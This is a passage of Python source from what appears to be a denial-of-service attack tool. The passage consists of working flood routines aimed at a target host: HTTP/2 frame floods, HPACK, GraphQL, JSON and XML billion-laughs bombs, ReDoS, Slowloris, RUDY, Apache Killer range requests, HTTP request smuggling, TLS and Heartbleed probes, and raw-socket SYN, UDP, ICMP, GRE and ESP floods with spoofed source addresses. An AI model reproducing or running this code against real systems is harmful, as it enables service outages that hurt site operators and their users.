                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== HTTP/2 SETTINGS FLOOD ==========
    def _h2_settings_flood(self):
        t = self._t(); last = time.monotonic()
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(2)
                s.connect((self.target_ip, self.target_port))
                s.send(preface)
                for _ in range(500):
                    if self._stop: break
                    # SETTINGS frame with max values
                    settings_data = struct.pack("!HI", 0x04, 0x7fffffff) * 5
                    frame = struct.pack("!I", len(settings_data))[1:] + b"\x04\x00\x00\x00\x00\x00" + settings_data
                    try:
                        s.send(frame)
                        t.sent += 1; t.bytes_sent += len(frame)
                        t.methods["HTTP2_SETTINGS_FLOOD"] += 1
                    except: break
                with suppress(Exception): s.close()
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== HTTP/2 WINDOW UPDATE FLOOD ==========
    def _h2_window_update_flood(self):
        t = self._t(); last = time.monotonic()
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(2)
                s.connect((self.target_ip, self.target_port))
                s.send(preface + settings)
                for _ in range(1000):
                    if self._stop: break
                    # WINDOW_UPDATE on stream 0 with max increment
                    wu = struct.pack("!I", 0x7fffffff)
                    frame = struct.pack("!I", 4)[1:] + b"\x08\x00\x00\x00\x00\x00" + wu
                    try:
                        s.send(frame)
                        t.sent += 1; t.bytes_sent += len(frame)
                        t.methods["HTTP2_WINDOW_UPDATE_FLOOD"] += 1
                    except: break
                with suppress(Exception): s.close()
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== HTTP/2 HPACK BOMB ==========
    def _h2_hpack_bomb(self):
        t = self._t(); last = time.monotonic()
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        # HPACK dynamic table size update to huge + indexed references
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(2)
                s.connect((self.target_ip, self.target_port))
                s.send(preface + settings)
                for _ in range(500):
                    if self._stop: break
                    # HEADERS with HPACK bomb payload
                    hpack = b"\x3f\xe1\x1f" + b"\x80" * 4000
                    frame = struct.pack("!I", len(hpack))[1:] + b"\x01\x05\x00\x00\x00\x01" + hpack
                    try:
                        s.send(frame)
                        t.sent += 1; t.bytes_sent += len(frame)
                        t.methods["HTTP2_HPACK_BOMB"] += 1
                    except: break
                with suppress(Exception): s.close()
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== HTTP/3 QUIC FLOOD ==========
    def _http3_quic_flood(self):
        t = self._t()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        last = time.monotonic()
        try:
            while not self._stop:
                self._check_bw()
                # QUIC Initial packet (version 1)
                dcid = os.urandom(8)
                scid = os.urandom(8)
                token = b""
                # Long header: first byte, version, DCID len, DCID, SCID len, SCID
                pkt = b"\xc3\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid
                pkt += b"\x00" + bytes([len(token)]) + token
                pkt += os.urandom(random.randint(1200, 1350))
                try:
                    s.sendto(pkt, (self.target_ip, self.target_port or 443))
                    t.sent += 1; t.bytes_sent += len(pkt); t.methods["HTTP3_QUIC_FLOOD"] += 1
                except Exception:
                    t.failed += 1; t.errors["quic"] += 1
                if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                    t.flush(self.stats, self.lock); last = time.monotonic()
        finally:
            with suppress(Exception): s.close()
            t.flush(self.stats, self.lock)

    # ========== HTTP/2 STREAM MULTIPLEX FLOOD ==========
    def _h2_stream_multiplex(self):
        t = self._t(); last = time.monotonic()
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                s.send(preface + settings)
                # Open 1000 streams without closing
                headers_payload = b"\x82\x86\x84\x41\x8c\xf1\xe3\xc0\xbf"
                for i in range(1000):
                    if self._stop: break
                    sid = (i * 2 + 1) & 0x7fffffff
                    frame = struct.pack("!I", len(headers_payload))[1:] + b"\x01\x05" + struct.pack("!I", sid) + headers_payload
                    try:
                        s.send(frame)
                        t.sent += 1; t.bytes_sent += len(frame)
                        t.methods["HTTP2_STREAM_MULTIPLEX"] += 1
                    except: break
                with suppress(Exception): s.close()
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== WEBSOCKET PERMESSAGE DEFLATE BOMB ==========
    def _ws_deflate_bomb(self):
        t = self._t(); last = time.monotonic()
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                key = base64.b64encode(os.urandom(16)).decode()
                upgrade = (f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
                           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
                           f"Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\r\n\r\n").encode()
                s.send(upgrade)
                with suppress(Exception): s.recv(1024)
                # Send deflate bomb frames
                payload = b"\x00" * 100000
                compressed = zlib.compress(payload)
                for _ in range(500):
                    if self._stop: break
                    # Binary frame with compression
                    mask = os.urandom(4)
                    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(compressed[:100]))
                    frame = b"\x82\xfe" + struct.pack("!H", len(masked)) + mask + masked
                    try:
                        s.send(frame)
                        t.sent += 1; t.bytes_sent += len(frame)
                        t.methods["WEBSOCKET_PERMESSAGE_DEFLATE_BOMB"] += 1
                    except: break
                with suppress(Exception): s.close()
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== GRAPHQL DEPTH BOMB ==========
    def _graphql_depth_bomb(self):
        t = self._t(); last = time.monotonic()
        # Generate deeply nested GraphQL query
        depth = 5000
        query = "query { " + "a { " * depth + "__typename" + " }" * depth + " }"
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                body = json.dumps({"query": query}).encode()
                req = (b"POST /graphql HTTP/1.1\r\nHost: " + self.target_host.encode() +
                       b"\r\nContent-Type: application/json\r\nContent-Length: " +
                       str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
                s.send(req)
                with suppress(Exception): s.recv(1024)
                with suppress(Exception): s.close()
                t.sent += 1; t.bytes_sent += len(req); t.methods["GRAPHQL_DEPTH_BOMB"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== GRAPHQL ALIAS BOMB ==========
    def _graphql_alias_bomb(self):
        t = self._t(); last = time.monotonic()
        aliases = " ".join([f"a{i}: __typename" for i in range(10000)])
        query = "query { " + aliases + " }"
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                body = json.dumps({"query": query}).encode()
                req = (b"POST /graphql HTTP/1.1\r\nHost: " + self.target_host.encode() +
                       b"\r\nContent-Type: application/json\r\nContent-Length: " +
                       str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
                s.send(req)
                with suppress(Exception): s.recv(1024)
                with suppress(Exception): s.close()
                t.sent += 1; t.bytes_sent += len(req); t.methods["GRAPHQL_ALIAS_BOMB"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== JSON BOMB ==========
    def _json_bomb(self):
        t = self._t(); last = time.monotonic()
        # Deeply nested JSON
        body = b'{"a":' * 5000 + b'1' + b'}' * 5000
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                req = (b"POST /api HTTP/1.1\r\nHost: " + self.target_host.encode() +
                       b"\r\nContent-Type: application/json\r\nContent-Length: " +
                       str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
                s.send(req)
                with suppress(Exception): s.close()
                t.sent += 1; t.bytes_sent += len(req); t.methods["JSON_BOMB"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== XML BOMB ==========
    def _xml_bomb(self):
        t = self._t(); last = time.monotonic()
        # Billion laughs XML
        body = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>"""
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                req = (b"POST /api HTTP/1.1\r\nHost: " + self.target_host.encode() +
                       b"\r\nContent-Type: application/xml\r\nContent-Length: " +
                       str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
                s.send(req)
                with suppress(Exception): s.close()
                t.sent += 1; t.bytes_sent += len(req); t.methods["XML_BOMB"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== REGEX DOS (ReDoS) ==========
    def _redos(self):
        t = self._t(); last = time.monotonic()
        # Payload that triggers catastrophic backtracking
        evil = "a" * 5000 + "X"
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                body = ("email=" + evil + "@test.com").encode()
                req = (b"POST /register HTTP/1.1\r\nHost: " + self.target_host.encode() +
                       b"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " +
                       str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
                s.send(req)
                with suppress(Exception): s.close()
                t.sent += 1; t.bytes_sent += len(req); t.methods["REGEX_DOS_REDOS"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== TLS CLIENT HELLO FLOOD ==========
    def _tls_hello_flood(self):
        t = self._t()
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ss = ctx.wrap_socket(s, server_hostname=self.target_host)
                with suppress(Exception): ss.close()
                t.sent += 1; t.methods["TLS_CLIENT_HELLO_FLOOD"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1

    def _tls_reneg(self):
        t = self._t()
        while not self._stop:
            self._check_bw()
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                ss = ctx.wrap_socket(s, server_hostname=self.target_host)
                with suppress(Exception): ss.close()
                t.sent += 1; t.methods["TLS_RENEGOTIATION"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1

    def _tls_heartbleed(self):
        t = self._t()
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                ctx = ssl.create_default_context()
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                ss = ctx.wrap_socket(s, server_hostname=self.target_host)
                with suppress(Exception):
                    # Heartbleed probe
                    ss.send(b"\x18\x03\x02\x00\x03\x01\x40\x00")
                    ss.recv(1)
                with suppress(Exception): ss.close()
                t.sent += 1; t.methods["TLS_HEARTBLEED"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1

    def _tls_sni_flood(self):
        t = self._t()
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                ctx = ssl.create_default_context()
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                ss = ctx.wrap_socket(s, server_hostname=os.urandom(8).hex() + ".com")
                with suppress(Exception): ss.close()
                t.sent += 1; t.methods["SNI_FLOOD_V2"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1

    # ========== SLOWLORIS V2 ==========
    def _slowloris_v2(self):
        t = self._t()
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(8)
                s.connect((self.target_ip, self.target_port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\n")
                # Send headers very slowly forever
                for i in range(5000):
                    if self._stop: break
                    time.sleep(random.uniform(5, 15))
                    try:
                        s.send(b"X-Pad-" + os.urandom(4).hex().encode() + b": " +
                               b"A" * random.randint(100, 500) + b"\r\n")
                    except: break
                with suppress(Exception): s.close()
                t.sent += 1; t.methods["SLOWLORIS_V2"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1

    # ========== RUDY V2 ==========
    def _rudy_v2(self):
        t = self._t()
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(15)
                s.connect((self.target_ip, self.target_port))
                s.send(b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() +
                       b"\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                       b"Content-Length: 999999999\r\n\r\n")
                for _ in range(5000):
                    if self._stop: break
                    try:
                        s.send(b"a" * 1)
                        time.sleep(random.uniform(5, 15))
                    except: break
                with suppress(Exception): s.close()
                t.sent += 1; t.methods["RUDY_V2"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1

    # ========== APACHE KILLER V2 ==========
    def _apache_killer_v2(self):
        t = self._t(); last = time.monotonic()
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                ranges = ",".join([f"{i}-{i+1}" for i in range(1000)])
                req = (b"GET / HTTP/1.1\r\nHost: " + self.target_host.encode() +
                       b"\r\nRange: bytes=" + ranges.encode() +
                       b"\r\nConnection: close\r\n\r\n")
                s.send(req)
                with suppress(Exception): s.recv(1024)
                with suppress(Exception): s.close()
                t.sent += 1; t.bytes_sent += len(req); t.methods["APACHE_KILLER_V2"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== RANGE HEADER BOMB ==========
    def _range_bomb(self):
        t = self._t(); last = time.monotonic()
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                ranges = ",".join([f"{random.randint(0, 99999)}-{random.randint(100000, 999999)}" for _ in range(500)])
                req = (b"GET / HTTP/1.1\r\nHost: " + self.target_host.encode() +
                       b"\r\nRange: bytes=" + ranges.encode() +
                       b"\r\nConnection: close\r\n\r\n")
                s.send(req)
                with suppress(Exception): s.close()
                t.sent += 1; t.bytes_sent += len(req); t.methods["RANGE_HEADER_BOMB"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== HTTP SMUGGLING CL.TE ==========
    def _smuggle_clte(self):
        t = self._t(); last = time.monotonic()
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                req = (b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() +
                       b"\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n"
                       b"0\r\n\r\nGET /admin HTTP/1.1\r\nX: X")
                s.send(req)
                with suppress(Exception): s.recv(1024)
                with suppress(Exception): s.close()
                t.sent += 1; t.bytes_sent += len(req); t.methods["HTTP_SMUGGLING_CLTE"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    def _smuggle_tecl(self):
        t = self._t(); last = time.monotonic()
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                req = (b"POST / HTTP/1.1\r\nHost: " + self.target_host.encode() +
                       b"\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
                       b"5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n")
                s.send(req)
                with suppress(Exception): s.recv(1024)
                with suppress(Exception): s.close()
                t.sent += 1; t.bytes_sent += len(req); t.methods["HTTP_SMUGGLING_TECL"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== WEBSOCKET FRAME FLOOD ==========
    def _ws_frame_flood(self):
        t = self._t(); last = time.monotonic()
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                key = base64.b64encode(os.urandom(16)).decode()
                upgrade = (f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
                           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode()
                s.send(upgrade)
                with suppress(Exception): s.recv(1024)
                for _ in range(2000):
                    if self._stop: break
                    payload = os.urandom(64)
                    mask = os.urandom(4)
                    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
                    frame = b"\x82\xfe" + struct.pack("!H", len(masked)) + mask + masked
                    try:
                        s.send(frame)
                        t.sent += 1; t.bytes_sent += len(frame)
                        t.methods["WEBSOCKET_FRAME_FLOOD"] += 1
                    except: break
                with suppress(Exception): s.close()
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== WEBSOCKET PING FLOOD ==========
    def _ws_ping_flood(self):
        t = self._t(); last = time.monotonic()
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                key = base64.b64encode(os.urandom(16)).decode()
                upgrade = (f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
                           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode()
                s.send(upgrade)
                with suppress(Exception): s.recv(1024)
                for _ in range(5000):
                    if self._stop: break
                    payload = os.urandom(8)
                    mask = os.urandom(4)
                    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
                    frame = b"\x89" + bytes([0x80 | len(masked)]) + mask + masked
                    try:
                        s.send(frame)
                        t.sent += 1; t.bytes_sent += len(frame)
                        t.methods["WEBSOCKET_PING_FLOOD"] += 1
                    except: break
                with suppress(Exception): s.close()
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== LAYER 4 CORE ==========
    def _syn_flood(self):
        t = self._t()
        if not self.raw_tcp: self._tcp_flood(); return
        last = time.monotonic()
        while not self._stop:
            self._check_bw()
            pkt = tcp_packet(self._rip(), self.target_ip, self._rport(), self.target_port,
                              random.getrandbits(32), 0, 0x02, ttl=random.randint(32, 128))
            try:
                self.raw_tcp.sendto(pkt, (self.target_ip, 0))
                t.sent += 1; t.bytes_sent += len(pkt); t.methods["SYN_TSUN"] += 1
            except Exception:
                t.failed += 1; t.errors["syn"] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    def _udp_flood(self):
        t = self._t()
        if not self.raw_udp:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16 * 1024 * 1024)
            last = time.monotonic()
            try:
                while not self._stop:
                    self._check_bw()
                    data = os.urandom(random.randint(1400, 65000))
                    try:
                        s.sendto(data, (self.target_ip, self.target_port))
                        t.sent += 1; t.bytes_sent += len(data); t.methods["UDP_APOC"] += 1
                    except Exception:
                        t.failed += 1; t.errors["udp"] += 1
                    if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                        t.flush(self.stats, self.lock); last = time.monotonic()
            finally:
                with suppress(Exception): s.close()
                t.flush(self.stats, self.lock)
            return
        last = time.monotonic()
        while not self._stop:
            self._check_bw()
            size = random.randint(1400, 65000)
            pkt = udp_packet(self._rip(), self.target_ip, self._rport(), self.target_port, os.urandom(size))
            try:
                self.raw_udp.sendto(pkt, (self.target_ip, 0))
                t.sent += 1; t.bytes_sent += len(pkt); t.methods["UDP_APOC"] += 1
            except Exception:
                t.failed += 1; t.errors["udp_raw"] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    def _icmp_flood(self):
        t = self._t()
        if not self.raw_icmp:
            self._tcp_flood(); return
        last = time.monotonic()
        while not self._stop:
            self._check_bw()
            pkt = icmp_packet(self._rip(), self.target_ip, os.urandom(random.randint(1024, 4096)))
            try:
                self.raw_icmp.sendto(pkt, (self.target_ip, 0))
                t.sent += 1; t.bytes_sent += len(pkt); t.methods["ICMP_STORM"] += 1
            except Exception:
                t.failed += 1; t.errors["icmp"] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    def _tcp_flood(self):
        t = self._t(); last = time.monotonic()
        while not self._stop:
            self._check_bw()
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(1.0)
                sock.connect((self.target_ip, self.target_port))
                req = (f"GET /?{uuid.uuid4().hex} HTTP/1.1\r\nHost: {self.target_host}\r\n"
                       f"User-Agent: {self._rua()}\r\nAccept: */*\r\n"
                       f"Accept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n\r\n").encode()
                sock.sendall(req)
                t.sent += 1; t.bytes_sent += len(req); t.methods["TCP_SPAM"] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            finally:
                if sock:
                    with suppress(Exception): sock.close()
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    def _flag_flood(self, flags, name):
        t = self._t()
        if not self.raw_tcp: self._tcp_flood(); return
        last = time.monotonic()
        while not self._stop:
            self._check_bw()
            pkt = tcp_packet(self._rip(), self.target_ip, self._rport(), self.target_port,
                              random.getrandbits(32), 0, flags)
            try:
                self.raw_tcp.sendto(pkt, (self.target_ip, 0))
                t.sent += 1; t.bytes_sent += len(pkt); t.methods[name] += 1
            except Exception:
                t.failed += 1; t.errors[name.lower()] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    def _ack_flood(self): self._flag_flood(0x10, "ACK_FLOOD")
    def _rst_flood(self): self._flag_flood(0x04, "RST_FLOOD")
    def _fin_flood(self): self._flag_flood(0x01, "FIN_FLOOD")
    def _xmas_flood(self): self._flag_flood(0x29, "XMAS_FLOOD")
    def _null_flood(self): self._flag_flood(0x00, "NULL_FLOOD")
    def _psh_flood(self): self._flag_flood(0x08, "PSH_FLOOD")
    def _urg_flood(self): self._flag_flood(0x20, "URG_FLOOD")
    def _syn_ack_flood(self): self._flag_flood(0x12, "SYN_ACK_FLOOD")

    def _gre_flood(self):
        t = self._t()
        if not self.raw_ip: self._udp_flood(); return
        last = time.monotonic()
        while not self._stop:
            self._check_bw()
            payload = os.urandom(random.randint(100, 1400))
            pkt = ip_header(self._rip(), self.target_ip, 47, len(payload)) + payload
            try:
                self.raw_ip.sendto(pkt, (self.target_ip, 0))
                t.sent += 1; t.bytes_sent += len(pkt); t.methods["GRE_FLOOD"] += 1
            except Exception:
                t.failed += 1; t.errors["gre"] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    def _esp_flood(self):
        t = self._t()
        if not self.raw_ip: self._udp_flood(); return
        last = time.monotonic()
        while not self._stop:
            self._check_bw()
            payload = os.urandom(random.randint(100, 1400))
            pkt = ip_header(self._rip(), self.target_ip, 50, len(payload)) + payload
            try:
                self.raw_ip.sendto(pkt, (self.target_ip, 0))
                t.sent += 1; t.bytes_sent += len(pkt); t.methods["ESP_FLOOD"] += 1
            except Exception:
                t.failed += 1; t.errors["esp"] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    def _ipip_flood(self):
        t = self._t()
        if not self.raw_ip: self._udp_flood(); return
        last = time.monotonic()
        while not self._stop:
            self._check_bw()
            inner = ip_header(self._rip(), "8.8.8.8", socket.IPPROTO_UDP, 64) + \
                    struct.pack('!HHHH', 1234, 53, 72, 0) + os.urandom(64)
            pkt = ip_header(self._rip(), self.target_ip, 4, len(inner)) + inner
            try:
                self.raw_ip.sendto(pkt, (self.target_ip, 0))
                t.sent += 1; t.bytes_sent += len(pkt); t.methods["IPIP_FLOOD"] += 1
            except Exception:
                t.failed += 1; t.errors["ipip"] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    def _frag_flood(self):
        t = self._t()
